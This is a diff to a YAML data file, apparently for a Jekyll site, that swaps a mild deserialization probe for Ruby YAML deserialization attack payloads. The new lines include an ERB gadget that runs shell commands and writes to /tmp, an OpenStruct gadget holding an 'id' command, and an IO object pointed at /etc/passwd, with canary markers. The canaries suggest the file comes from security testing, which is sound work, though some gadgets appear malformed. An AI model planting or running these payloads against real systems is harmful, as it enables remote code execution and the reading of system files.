@@ -1,13 +1,13 @@
-# Attempt YAML deserialization via _data files
-# Try generic Ruby object instantiation
-generic: !ruby/object:OpenStruct
+# Attempt RCE via Ruby YAML deserialization
+# Gadget: ERB template injection
+erb: !ruby/object:ERB
+  src: "`id > /tmp/jekyll_rce.txt 2>&1; echo PWNED`"
+  safe_level: 
+# Gadget: Try Kernel#system via OpenStruct
+cmd: !ruby/object:OpenStruct
   table:
-    :key: value
-# Try Gem requirement deserialization
-dep: !ruby/object:Gem::Requirement
-  requirements:
-  - - ">="
-    - !ruby/object:Gem::Version
-      version: "1.0"
-# Try to trigger a callback via URI parsing  
-yaml_test: "DESERIALIZATION_TEST_CANARY"
+    :command: "id"
+# Try to read /etc/passwd via IO  
+file_read: !ruby/object:IO
+  data: "/etc/passwd"
+canary: "RCE_TEST_V2"
